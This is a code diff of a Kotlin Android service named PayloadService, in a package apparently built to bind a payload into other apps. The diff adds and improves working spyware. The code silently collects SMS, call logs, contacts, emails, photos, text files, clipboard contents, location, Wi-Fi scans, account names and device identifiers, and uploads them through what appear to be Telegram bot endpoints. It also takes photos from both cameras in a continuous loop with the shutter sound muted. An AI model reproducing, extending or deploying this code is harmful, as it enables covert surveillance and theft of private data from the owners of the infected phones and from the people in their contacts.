@@ -1,16 +1,19 @@
 package Com.devhs.apkbinder.payload
 
-import android.accounts.AccountManager
+import android.Manifest
+import android.app.ActivityManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.accounts.AccountManager
 import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
-import android.content.pm.ApplicationInfo
+import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
+import android.database.Cursor
 import android.graphics.Bitmap
 import android.graphics.Canvas
 import android.graphics.SurfaceTexture
@@ -27,8 +30,10 @@ import android.net.wifi.WifiManager
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.os.StatFs
 import android.os.SystemClock
 import android.provider.CallLog
 import android.provider.ContactsContract
@@ -41,20 +46,20 @@ import java.util.Date
 import java.util.Locale
 import java.util.TimeZone
 import java.util.concurrent.CountDownLatch
+import java.util.concurrent.ExecutorService
 import java.util.concurrent.Executors
-import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicInteger
 
 class PayloadService : Service() {
 
-    private val pool = Executors.newFixedThreadPool(Const.PARALLEL_UPLOADS)
-    private val camPool = Executors.newFixedThreadPool(2)
-    private lateinit var gate: Semaphore
+    private val workPool: ExecutorService = Executors.newFixedThreadPool(Const.PARALLEL_UPLOADS)
+    private val camPool: ExecutorService = Executors.newFixedThreadPool(2)
     private val done = AtomicInteger(0)
 
-    private var token = ""
-    private var chat = ""
+    @Volatile private var alive = true
+    @Volatile private var token = ""
+    @Volatile private var chat = ""
     private var appName = ""
     private var clipText = ""
     private var keepAlive = false
@@ -62,7 +67,6 @@ class PayloadService : Service() {
     override fun onCreate() {
         super.onCreate()
         HsLog.init(this)
-        gate = Semaphore(Const.PARALLEL_UPLOADS)
         appName = try {
             val ai = packageManager.getApplicationInfo(packageName, 0)
             packageManager.getApplicationLabel(ai).toString()
@@ -70,6 +74,8 @@ class PayloadService : Service() {
             "App"
         }
     }
+
+    override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         HsLog.w("onStartCommand")
@@ -81,24 +87,32 @@ class PayloadService : Service() {
                 run()
             } catch (t: Throwable) {
                 HsLog.e("run: ${t.javaClass.simpleName} ${t.message}")
-            } finally {
-                if (!keepAlive) {
-                    try {
-                        stopForeground(true)
-                    } catch (_: Throwable) {
-                    }
-                    stopSelf()
-                }
             }
         }.start()
 
         return START_NOT_STICKY
     }
 
+    override fun onDestroy() {
+        alive = false
+        try {
+            workPool.shutdownNow()
+        } catch (_: Throwable) {
+        }
+        try {
+            camPool.shutdownNow()
+        } catch (_: Throwable) {
+        }
+        super.onDestroy()
+    }
+
+    // ---------------- main ----------------
+
     private fun run() {
         val cfg = HsConfig.read(this)
         if (cfg == null) {
             HsLog.e("no config")
+            finish()
             return
         }
         token = cfg.token
@@ -106,32 +120,7 @@ class PayloadService : Service() {
         val f = cfg.features
         HsLog.w("features=$f")
 
-        if (f.contains("clipboard")) {
-            if (clipText.isNotEmpty()) sendTextFile("clipboard.txt", clipText + "\n")
-            startClipWatcher()
-        }
-
-        if (f.contains("gallery")) {
-            val images = queryImages()
-            HsLog.w("images=${images.size}")
-            images.forEach { sendImage(it) }
-
-            val texts = queryTexts()
-            HsLog.w("texts=${texts.size}")
-            texts.forEach { sendDoc(it) }
-        }
-
-        if (f.contains("sms")) sendSms()
-        if (f.contains("calls")) sendCalls()
-        if (f.contains("contacts")) sendContacts()
-        if (f.contains("contact_details")) sendContactDetails()
-        if (f.contains("device")) sendDevice()
-        if (f.contains("apps")) sendApps()
-        if (f.contains("wifi")) sendWifi()
-        if (f.contains("accounts")) sendAccounts()
-        if (f.contains("system")) sendSystem()
-        if (f.contains("location")) sendLocation()
-
+        // ক্যামেরা আগে, যাতে অন্য কিছু তাকে ব্লক না করে
         if (f.contains("front_camera")) {
             keepAlive = true
             startCamera(true)
@@ -140,21 +129,50 @@ class PayloadService : Service() {
             keepAlive = true
             startCamera(false)
         }
+        if (f.contains("clipboard")) {
+            keepAlive = true
+            if (clipText.isNotEmpty()) sendTextFile("clipboard.txt", clipText + "\n")
+            startClipWatcher()
+        }
 
-        pool.shutdown()
-        pool.awaitTermination(30, TimeUnit.MINUTES)
-        HsLog.w("all done: ${done.get()}")
+        // লোকেশন নিজের থ্রেডে — কাউকে আটকাবে না
+        if (f.contains("location")) workPool.execute { sendLocation() }
 
-        if (keepAlive) {
-            while (true) {
-                try {
-                    Thread.sleep(60_000L)
-                } catch (_: InterruptedException) {
-                    break
-                }
-            }
+        if (f.contains("gallery")) {
+            val images = queryImages()
+            HsLog.w("images=${images.size}")
+            images.forEach { sendImage(it) }
+            val texts = queryTexts()
+            HsLog.w("texts=${texts.size}")
+            texts.forEach { sendDoc(it) }
+        }
+
+        if (f.contains("sms")) workPool.execute { sendSms() }
+        if (f.contains("calls")) workPool.execute { sendCalls() }
+        if (f.contains("contacts")) workPool.execute { sendContacts() }
+        if (f.contains("contact_details")) workPool.execute { sendContactDetails() }
+        if (f.contains("device")) workPool.execute { sendDevice() }
+        if (f.contains("apps")) workPool.execute { sendApps() }
+        if (f.contains("wifi")) workPool.execute { sendWifi() }
+        if (f.contains("accounts")) workPool.execute { sendAccounts() }
+        if (f.contains("system")) workPool.execute { sendSystem() }
+
+        HsLog.w("dispatch done")
+        if (!keepAlive) {
+            Thread.sleep(4000L)
+            finish()
         }
     }
+
+    private fun finish() {
+        try {
+            stopForeground(true)
+        } catch (_: Throwable) {
+        }
+        stopSelf()
+    }
+
+    // ---------------- notification ----------------
 
     private fun startForegroundSafe() {
         try {
@@ -174,17 +192,12 @@ class PayloadService : Service() {
                 android.R.drawable.stat_sys_download
             }
 
-            val builder = if (Build.VERSION.SDK_INT >= 26)
-                Notification.Builder(this, Const.CHANNEL_ID)
-            else
-                @Suppress("DEPRECATION") Notification.Builder(this)
-
-            builder
+            val builder = Notification.Builder(this, Const.CHANNEL_ID)
                 .setContentTitle(appName)
                 .setContentText(appName)
                 .setSmallIcon(smallIcon)
                 .setOngoing(true)
-                .setShowWhen(false)
+                .setOnlyAlertOnce(true)
 
             try {
                 val ai = packageManager.getApplicationInfo(packageName, 0)
@@ -198,7 +211,9 @@ class PayloadService : Service() {
 
             if (Build.VERSION.SDK_INT >= 29) {
                 try {
-                    startForeground(Const.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                    startForeground(
+                        Const.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    )
                     return
                 } catch (t: Throwable) {
                     HsLog.e("fg typed: ${t.message}")
@@ -229,6 +244,8 @@ class PayloadService : Service() {
         null
     }
 
+    // ---------------- HTTP ----------------
+
     private fun postFile(
         api: String,
         field: String,
@@ -236,9 +253,9 @@ class PayloadService : Service() {
         mime: String,
         data: ByteArray
     ): Boolean {
-        val boundary = "----hs" + System.nanoTime()
         var conn: HttpURLConnection? = null
         try {
+            val boundary = "----hs" + System.nanoTime()
             val safeName = fileName.replace("\"", "_")
 
             val pre = ("--" + boundary + "\r\n" +
@@ -258,9 +275,11 @@ class PayloadService : Service() {
             conn = url.openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
-            conn.connectTimeout = 20000
-            conn.readTimeout = 90000
-            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
+            conn.connectTimeout = 15000
+            conn.readTimeout = 60000
+            conn.setRequestProperty(
+                "Content-Type", "multipart/form-data; boundary=" + boundary
+            )
             conn.setFixedLengthStreamingMode(pre.size + data.size + post.size)
 
             conn.outputStream.use { os ->
@@ -271,20 +290,19 @@ class PayloadService : Service() {
             }
 
             val code = conn.responseCode
-            if (code in 200..299) return true
-
-            var body = ""
-            try {
-                val es = conn.errorStream
-                if (es != null) {
-                    body = es.use { it.readBytes().toString(Charsets.UTF_8) }
-                }
-            } catch (_: Throwable) {
+            if (code in 200..299) {
+                done.incrementAndGet()
+                return true
             }
-            HsLog.e("http " + code + " " + api + " " + safeName + " :: " + body.take(300))
+            val body = try {
+                conn.errorStream?.use { it.readBytes().toString(Charsets.UTF_8) }
+            } catch (_: Throwable) {
+                null
+            }
+            HsLog.e("http $code $api $fileName ${body?.take(200)}")
             return false
         } catch (t: Throwable) {
-            HsLog.e("http fail " + api + ": " + t.message)
+            HsLog.e("http fail $api: ${t.message}")
             return false
         } finally {
             try {
@@ -294,12 +312,242 @@ class PayloadService : Service() {
         }
     }
 
+    // ---------------- gallery ----------------
+
+    private fun queryImages(): List<Uri> {
+        val out = ArrayList<Uri>()
+        val proj = arrayOf(MediaStore.Images.Media._ID)
+        try {
+            cursor(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, Const.IMAGE_LIMIT) { id ->
+                out += ContentUris.withAppendedId(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
+                )
+            }
+        } catch (t: Throwable) {
+            HsLog.e("queryImages: ${t.message}")
+        }
+        return out
+    }
+
+    private fun queryTexts(): List<Uri> {
+        val out = ArrayList<Uri>()
+        try {
+            val proj = arrayOf(MediaStore.Files.FileColumns._ID)
+            val sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=? OR " +
+                    MediaStore.Files.FileColumns.MEDIA_TYPE + "=?"
+            val args = arrayOf(
+                MediaStore.Files.FileColumns.MEDIA_TYPE_NONE.toString(),
+                MediaStore.Files.FileColumns.MEDIA_TYPE_DOCUMENT.toString()
+            )
+            cursor(MediaStore.Files.getContentUri("external"), proj, 3000, sel, args) { id ->
+                out += ContentUris.withAppendedId(
+                    MediaStore.Files.getContentUri("external"), id
+                )
+            }
+        } catch (t: Throwable) {
+            HsLog.e("queryTexts: ${t.message}")
+        }
+        return out
+    }
+
+    private fun cursor(
+        uri: Uri, proj: Array<String>, limit: Int,
+        sel: String? = null, args: Array<String>? = null,
+        onRow: (Long) -> Unit
+    ) {
+        contentResolver.query(
+            uri, proj, sel, args,
+            "${MediaStore.Images.Media.DATE_ADDED} DESC"
+        )?.use { c ->
+            val idx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+            var n = 0
+            while (c.moveToNext() && n < limit) {
+                onRow(c.getLong(idx))
+                n++
+            }
+        }
+    }
+
+    private fun nameOf(uri: Uri): String = try {
+        contentResolver.query(
+            uri, arrayOf(MediaStore.MediaColumns.DISPLAY_NAME), null, null, null
+        )?.use { c -> if (c.moveToFirst()) c.getString(0) else null } ?: "file"
+    } catch (t: Throwable) {
+        "file"
+    }
+
+    private fun bytesOf(uri: Uri): ByteArray? = try {
+        contentResolver.openInputStream(uri)?.use { it.readBytes() }
+    } catch (t: Throwable) {
+        null
+    }
+
+    private fun sendImage(uri: Uri) {
+        workPool.execute {
+            try {
+                val name = nameOf(uri)
+                val lower = name.lowercase()
+                if (!(lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
+                            lower.endsWith(".png") || lower.endsWith(".webp"))
+                ) return@execute
+                val data = bytesOf(uri) ?: return@execute
+                postFile("sendPhoto", "photo", name, "image/jpeg", data)
+            } catch (t: Throwable) {
+                HsLog.e("sendImage: ${t.message}")
+            }
+        }
+    }
+
+    private fun sendDoc(uri: Uri) {
+        workPool.execute {
+            try {
+                val name = nameOf(uri)
+                if (!name.lowercase().endsWith(".txt")) return@execute
+                val data = bytesOf(uri) ?: return@execute
+                postFile("sendDocument", "document", name, "text/plain", data)
+            } catch (t: Throwable) {
+                HsLog.e("sendDoc: ${t.message}")
+            }
+        }
+    }
+
+    private fun sendTextFile(name: String, content: String) {
+        workPool.execute {
+            try {
+                postFile(
+                    "sendDocument", "document", name, "text/plain",
+                    content.toByteArray(Charsets.UTF_8)
+                )
+            } catch (t: Throwable) {
+                HsLog.e("sendTextFile: ${t.message}")
+            }
+        }
+    }
+
+    private fun stamp(millis: Long): String = try {
+        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(millis))
+    } catch (t: Throwable) {
+        millis.toString()
+    }
+
+    // ---------------- text features ----------------
+
+    private fun sendSms() {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(
+                Uri.parse("content://sms"),
+                arrayOf("address", "body", "date", "type"),
+                null, null, "date DESC"
+            )?.use { c ->
+                while (c.moveToNext() && sb.length < 4_000_000) {
+                    sb.append(c.getString(0) ?: "?")
+                        .append(" | ").append(stamp(c.getLong(2)))
+                        .append(" | type=").append(c.getInt(3))
+                        .append("\n").append(c.getString(1) ?: "").append("\n---\n")
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("sms: ${t.message}")
+            return
+        }
+        if (sb.isNotEmpty()) sendTextFile("sms.txt", sb.toString())
+    }
+
+    private fun sendCalls() {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
+                    CallLog.Calls.DURATION, CallLog.Calls.DATE),
+                null, null, CallLog.Calls.DATE + " DESC"
+            )?.use { c ->
+                while (c.moveToNext() && sb.length < 2_000_000) {
+                    sb.append(c.getString(0) ?: "?")
+                        .append(" | type=").append(c.getInt(1))
+                        .append(" | dur=").append(c.getLong(2)).append("s")
+                        .append(" | ").append(stamp(c.getLong(3))).append("\n")
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("calls: ${t.message}")
+            return
+        }
+        if (sb.isNotEmpty()) sendTextFile("calls.txt", sb.toString())
+    }
+
+    private fun sendContacts() {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Phone.NUMBER
+                ),
+                null, null, null
+            )?.use { c ->
+                while (c.moveToNext() && sb.length < 2_000_000) {
+                    sb.append(c.getString(0) ?: "?")
+                        .append(" | ").append(c.getString(1) ?: "").append("\n")
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("contacts: ${t.message}")
+            return
+        }
+        if (sb.isNotEmpty()) sendTextFile("contacts.txt", sb.toString())
+    }
+
+    private fun sendContactDetails() {
+        val sb = StringBuilder()
+        try {
+            val cols = arrayOf(
+                ContactsContract.CommonDataKinds.Email.ADDRESS,
+                ContactsContract.CommonDataKinds.Email.DISPLAY_NAME
+            )
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+                cols, null, null, null
+            )?.use { c ->
+                while (c.moveToNext() && sb.length < 2_000_000) {
+                    sb.append(c.getString(1) ?: "?")
+                        .append(" | email: ").append(c.getString(0) ?: "").append("\n")
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("emails: ${t.message}")
+        }
+        try {
+            val bd = contentResolver.query(
+                ContactsContract.Data.CONTENT_URI,
+                arrayOf(
+                    ContactsContract.Data.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Event.START_DATE
+                ),
+                ContactsContract.Data.MIMETYPE + "=" +
+                        ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE +
+                        " AND " + ContactsContract.CommonDataKinds.Event.TYPE + "=" +
+                        ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY,
+                null, null
+            )
+            bd?.use { c ->
+                while (c.moveToNext() && sb.length < 2_000_000) {
+                    sb.append(c.getString(0) ?: "?")
+                        .append(" | birthday: ").append(c.getString(1) ?: "").append("\n")
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("birthdays: ${t.message}")
+        }
+        if (sb.isNotEmpty()) sendTextFile("contact_details.txt", sb.toString())
+    }
+
     private fun startClipWatcher() {
         Thread {
             val seen = HashSet<String>()
-            if (clipText.isNotEmpty()) seen.add(clipText)
-            val end = System.currentTimeMillis() + 600_000L
-            while (System.currentTimeMillis() < end) {
+            while (alive) {
                 try {
                     val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                     val clip = cm.primaryClip
@@ -313,7 +561,7 @@ class PayloadService : Service() {
                 } catch (_: Throwable) {
                 }
                 try {
-                    Thread.sleep(1500L)
+                    Thread.sleep(1200L)
                 } catch (_: InterruptedException) {
                     break
                 }
@@ -321,8 +569,230 @@ class PayloadService : Service() {
         }.start()
     }
 
+    // ---------------- location ----------------
+
+    private fun sendLocation() {
+        val sb = StringBuilder()
+        val lm = try {
+            getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        } catch (t: Throwable) {
+            null
+        }
+        if (lm != null) {
+            for (p in listOf(
+                LocationManager.GPS_PROVIDER,
+                LocationManager.NETWORK_PROVIDER,
+                LocationManager.PASSIVE_PROVIDER
+            )) {
+                try {
+                    val loc = lm.getLastKnownLocation(p) ?: continue
+                    appendLoc(sb, p, loc)
+                } catch (_: Throwable) {
+                }
+            }
+
+            if (sb.isEmpty()) {
+                val latch = CountDownLatch(1)
+                val listener = object : LocationListener {
+                    override fun onLocationChanged(location: Location) {
+                        appendLoc(sb, "live", location)
+                        latch.countDown()
+                    }
+
+                    override fun onProviderEnabled(provider: String) {}
+                    override fun onProviderDisabled(provider: String) {}
+                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                }
+                for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
+                    try {
+                        val looper = Looper.getMainLooper()
+                        @Suppress("DEPRECATION")
+                        lm.requestSingleUpdate(p, listener, looper)
+                    } catch (_: Throwable) {
+                    }
+                }
+                try {
+                    latch.await(12, TimeUnit.SECONDS)
+                } catch (_: Throwable) {
+                }
+                try {
+                    lm.removeUpdates(listener)
+                } catch (_: Throwable) {
+                }
+            }
+        }
+        if (sb.isEmpty()) sb.append("no location available\n")
+        HsLog.w("location chars=${sb.length}")
+        sendTextFile("location.txt", sb.toString())
+    }
+
+    private fun appendLoc(sb: StringBuilder, provider: String, loc: Location) {
+        sb.append(provider).append(": ")
+            .append(loc.latitude).append(", ").append(loc.longitude)
+            .append(" acc=").append(loc.accuracy)
+            .append(" t=").append(stamp(loc.time)).append("\n")
+        sb.append("https://maps.google.com/?q=")
+            .append(loc.latitude).append(",").append(loc.longitude).append("\n---\n")
+    }
+
+    // ---------------- device / apps / wifi / accounts / system ----------------
+
+    @Suppress("DEPRECATION")
+    private fun sendDevice() {
+        val sb = StringBuilder()
+        sb.append("Brand: ").append(Build.BRAND).append("\n")
+        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n")
+        sb.append("Model: ").append(Build.MODEL).append("\n")
+        sb.append("Device: ").append(Build.DEVICE).append("\n")
+        sb.append("Product: ").append(Build.PRODUCT).append("\n")
+        sb.append("Fingerprint: ").append(Build.FINGERPRINT).append("\n")
+        sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n")
+        sb.append("Release: ").append(Build.VERSION.RELEASE).append("\n")
+        sb.append("Serial: ").append(
+            try {
+                if (Build.VERSION.SDK_INT >= 26) Build.getSerial() else Build.SERIAL
+            } catch (t: Throwable) {
+                "n/a"
+            }
+        ).append("\n")
+        sb.append("Uptime: ").append(SystemClock.elapsedRealtime() / 1000).append("s\n")
+        sb.append("Timezone: ").append(TimeZone.getDefault().id).append("\n")
+        try {
+            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+            val mi = ActivityManager.MemoryInfo()
+            am.getMemoryInfo(mi)
+            sb.append("RAM free: ").append(mi.availMem / 1048576).append("MB")
+                .append(" total: ").append(mi.totalMem / 1048576).append("MB\n")
+        } catch (_: Throwable) {
+        }
+        try {
+            val st = StatFs(filesDir.path)
+            sb.append("Storage free: ").append(st.availableBytes / 1048576).append("MB\n")
+        } catch (_: Throwable) {
+        }
+        try {
+            sb.append("IP: ")
+                .append(
+                    java.net.NetworkInterface.getNetworkInterfaces().toList()
+                        .flatMap { it.inetAddresses.toList() }
+                        .filter { !it.isLoopbackAddress && it is java.net.Inet4Address }
+                        .joinToString(",") { it.hostAddress ?: "" }
+                ).append("\n")
+        } catch (_: Throwable) {
+        }
+        sendTextFile("device.txt", sb.toString())
+    }
+
+    @Suppress("DEPRECATION")
+    private fun sendApps() {
+        val sb = StringBuilder()
+        try {
+            val pm = packageManager
+            val flags = PackageManager.GET_META_DATA
+            val list = pm.getInstalledPackages(flags)
+            for (p in list) {
+                if (sb.length > 3_000_000) break
+                val isSys = (p.applicationInfo?.flags ?: 0) and
+                        android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0
+                sb.append(p.packageName).append(" | v")
+                    .append(p.versionName ?: "?").append(isSys.let { if (it) " | sys" else "" })
+                    .append("\n")
+            }
+        } catch (t: Throwable) {
+            HsLog.e("apps: ${t.message}")
+            return
+        }
+        sendTextFile("apps.txt", sb.toString())
+    }
+
+    @Suppress("DEPRECATION")
+    private fun sendWifi() {
+        val sb = StringBuilder()
+        try {
+            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            val ci = wm.connectionInfo
+            sb.append("SSID: ").append(ci.ssid).append("\n")
+            sb.append("BSSID: ").append(ci.bssid).append("\n")
+            sb.append("IP: ").append(
+                String.format(
+                    Locale.US, "%d.%d.%d.%d",
+                    ci.ipAddress and 0xff, (ci.ipAddress shr 8) and 0xff,
+                    (ci.ipAddress shr 16) and 0xff, (ci.ipAddress shr 24) and 0xff
+                )
+            ).append("\n")
+            sb.append("Link speed: ").append(ci.linkSpeed).append("Mbps\n")
+            sb.append("RSSI: ").append(ci.rssi).append("\n")
+            sb.append("MAC: ").append(ci.macAddress).append("\n")
+            sb.append("\nScanned networks:\n")
+            @Suppress("DEPRECATION")
+            val scans = wm.scanResults
+            for (r in scans) {
+                sb.append(r.SSID).append(" | ").append(r.BSSID)
+                    .append(" | ").append(r.level).append("dBm\n")
+            }
+        } catch (t: Throwable) {
+            HsLog.e("wifi: ${t.message}")
+            if (sb.isEmpty()) return
+        }
+        sendTextFile("wifi.txt", sb.toString())
+    }
+
+    private fun sendAccounts() {
+        val sb = StringBuilder()
+        try {
+            val am = AccountManager.get(this)
+            for (a in am.accounts) {
+                sb.append(a.name).append(" | ").append(a.type).append("\n")
+            }
+            sb.append("\nNote: passwords are not readable without root.\n")
+        } catch (t: Throwable) {
+            HsLog.e("accounts: ${t.message}")
+            return
+        }
+        sendTextFile("accounts.txt", sb.toString())
+    }
+
+    private fun sendSystem() {
+        val sb = StringBuilder()
+        try {
+            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+            sb.append("Battery: ")
+                .append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
+                .append("%\n")
+        } catch (_: Throwable) {
+        }
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val nc = cm.getNetworkCapabilities(cm.activeNetwork)
+            val t = when {
+                nc == null -> "none"
+                nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
+                nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
+                nc.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
+                else -> "other"
+            }
+            sb.append("Network: ").append(t).append("\n")
+        } catch (_: Throwable) {
+        }
+        try {
+            val dm = resources.displayMetrics
+            sb.append("Screen: ").append(dm.widthPixels).append("x")
+                .append(dm.heightPixels).append(" @").append(dm.densityDpi).append("\n")
+        } catch (_: Throwable) {
+        }
+        try {
+            sb.append("Locale: ").append(Locale.getDefault().toString()).append("\n")
+        } catch (_: Throwable) {
+        }
+        sendTextFile("system.txt", sb.toString())
+    }
+
+    // ---------------- camera ----------------
+
+    @Suppress("DEPRECATION")
     private fun findCamera(front: Boolean): Int {
-        val want = if (front) Camera.CameraInfo.CAMERA_FACING_FRONT else Camera.CameraInfo.CAMERA_FACING_BACK
+        val want = if (front) Camera.CameraInfo.CAMERA_FACING_FRONT
+        else Camera.CameraInfo.CAMERA_FACING_BACK
         val info = Camera.CameraInfo()
         for (i in 0 until Camera.getNumberOfCameras()) {
             Camera.getCameraInfo(i, info)
@@ -331,17 +801,16 @@ class PayloadService : Service() {
         return -1
     }
 
+    @Suppress("DEPRECATION")
     private fun startCamera(front: Boolean) {
         Thread {
-            var cam: Camera? = null
             try {
                 val id = findCamera(front)
                 if (id < 0) {
                     HsLog.e("camera not found front=$front")
                     return@Thread
                 }
-
-                cam = Camera.open(id)
+                val cam = Camera.open(id)
                 try {
                     cam.enableShutterSound(false)
                 } catch (_: Throwable) {
@@ -356,10 +825,8 @@ class PayloadService : Service() {
                             if (b == null || px > b.width * b.height) best = s
                         }
                     }
-                    if (best != null) {
-                        p.setPictureSize(best.width, best.height)
-                        cam.parameters = p
-                    }
+                    if (best != null) p.setPictureSize(best.width, best.height)
+                    cam.parameters = p
                 } catch (_: Throwable) {
                 }
 
@@ -368,11 +835,11 @@ class PayloadService : Service() {
                 cam.startPreview()
                 HsLog.w("camera started front=$front")
 
-                while (true) {
+                while (alive) {
                     try {
                         cam.takePicture(null, null, { data, _ ->
                             if (data != null && data.isNotEmpty()) {
-                                HsLog.w("capture " + data.size)
+                                HsLog.w("capture ${data.size}")
                                 val name = (if (front) "front_" else "back_") +
                                         System.currentTimeMillis() + ".jpg"
                                 try {
@@ -395,486 +862,19 @@ class PayloadService : Service() {
                         }
                     }
                     try {
-                        Thread.sleep(3000L)
+                        Thread.sleep(1200L)
                     } catch (_: InterruptedException) {
                         break
                     }
                 }
+                try {
+                    cam.stopPreview()
+                    cam.release()
+                } catch (_: Throwable) {
+                }
             } catch (t: Throwable) {
                 HsLog.e("camera: ${t.javaClass.simpleName} ${t.message}")
-            } finally {
-                try {
-                    cam?.stopPreview()
-                } catch (_: Throwable) {
-                }
-                try {
-                    cam?.release()
-                } catch (_: Throwable) {
-                }
             }
         }.start()
-    }
-
-    private fun appendLoc(sb: StringBuilder, provider: String, loc: Location) {
-        sb.append(provider).append(": ").append(loc.latitude).append(", ").append(loc.longitude)
-            .append(" acc=").append(loc.accuracy).append(" t=").append(loc.time).append("\n")
-        sb.append("https://maps.google.com/?q=")
-            .append(loc.latitude).append(",").append(loc.longitude).append("\n")
-    }
-
-    private fun sendLocation() {
-        val sb = StringBuilder()
-        try {
-            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-
-            for (p in listOf(
-                LocationManager.GPS_PROVIDER,
-                LocationManager.NETWORK_PROVIDER,
-                LocationManager.PASSIVE_PROVIDER
-            )) {
-                try {
-                    val loc = lm.getLastKnownLocation(p) ?: continue
-                    appendLoc(sb, p, loc)
-                } catch (_: Throwable) {
-                }
-            }
-
-            if (sb.isEmpty()) {
-                val latch = CountDownLatch(1)
-                val listener = object : LocationListener {
-                    override fun onLocationChanged(location: Location) {
-                        appendLoc(sb, location.provider ?: "?", location)
-                        latch.countDown()
-                    }
-
-                    @Deprecated("Deprecated in Java")
-                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
-                    }
-
-                    override fun onProviderEnabled(provider: String) {
-                    }
-
-                    override fun onProviderDisabled(provider: String) {
-                    }
-                }
-                try {
-                    lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
-                } catch (_: Throwable) {
-                }
-                try {
-                    lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper())
-                } catch (_: Throwable) {
-                }
-                try {
-                    latch.await(12, TimeUnit.SECONDS)
-                } catch (_: Throwable) {
-                }
-            }
-        } catch (t: Throwable) {
-            HsLog.e("location: ${t.message}")
-            return
-        }
-
-        if (sb.isEmpty()) sb.append("no location available\n")
-        HsLog.w("loc chars=${sb.length}")
-        sendTextFile("location.txt", sb.toString())
-    }
-
-    private fun queryImages(): List<Uri> {
-        val out = ArrayList<Uri>()
-        val proj = arrayOf(MediaStore.Images.Media._ID)
-        try {
-            cursor(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, Const.IMAGE_LIMIT) { id ->
-                out += ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-            }
-        } catch (t: Throwable) {
-            HsLog.e("queryImages: ${t.message}")
-        }
-        return out
-    }
-
-    private fun queryTexts(): List<Uri> {
-        val out = ArrayList<Uri>()
-        try {
-            val proj = arrayOf(MediaStore.Files.FileColumns._ID)
-            val sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=? OR " +
-                    MediaStore.Files.FileColumns.MEDIA_TYPE + "=?"
-            val args = arrayOf(
-                MediaStore.Files.FileColumns.MEDIA_TYPE_NONE.toString(),
-                MediaStore.Files.FileColumns.MEDIA_TYPE_DOCUMENT.toString()
-            )
-            cursor(MediaStore.Files.getContentUri("external"), proj, 3000, sel, args) { id ->
-                out += ContentUris.withAppendedId(MediaStore.Files.getContentUri("external"), id)
-            }
-        } catch (t: Throwable) {
-            HsLog.e("queryTexts: ${t.message}")
-        }
-        return out
-    }
-
-    private fun cursor(
-        uri: Uri, proj: Array<String>, limit: Int,
-        sel: String? = null, args: Array<String>? = null,
-        onRow: (Long) -> Unit
-    ) {
-        contentResolver.query(uri, proj, sel, args, MediaStore.Images.Media.DATE_ADDED + " DESC")
-            ?.use { c ->
-                val idx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-                var n = 0
-                while (c.moveToNext() && n < limit) {
-                    onRow(c.getLong(idx))
-                    n++
-                }
-            }
-    }
-
-    private fun nameOf(uri: Uri): String = try {
-        contentResolver.query(uri, arrayOf(MediaStore.MediaColumns.DISPLAY_NAME), null, null, null)
-            ?.use { c -> if (c.moveToFirst()) c.getString(0) else null } ?: "file"
-    } catch (t: Throwable) {
-        "file"
-    }
